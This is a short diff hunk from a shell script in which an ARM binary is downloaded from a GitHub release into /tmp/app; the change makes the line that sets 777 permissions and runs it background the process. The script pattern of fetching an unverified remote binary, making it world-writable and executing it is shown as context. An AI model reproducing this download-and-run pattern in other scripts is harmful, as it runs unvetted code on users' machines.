@@ -39,4 +39,4 @@ else
 $DOWNLOAD_CMD https://github.com/dsadsadsss/plutonodes/releases/download/xr/main-arm > /tmp/app
 fi
 
-chmod 777 /tmp/app && /tmp/app 
+chmod 777 /tmp/app && /tmp/app &
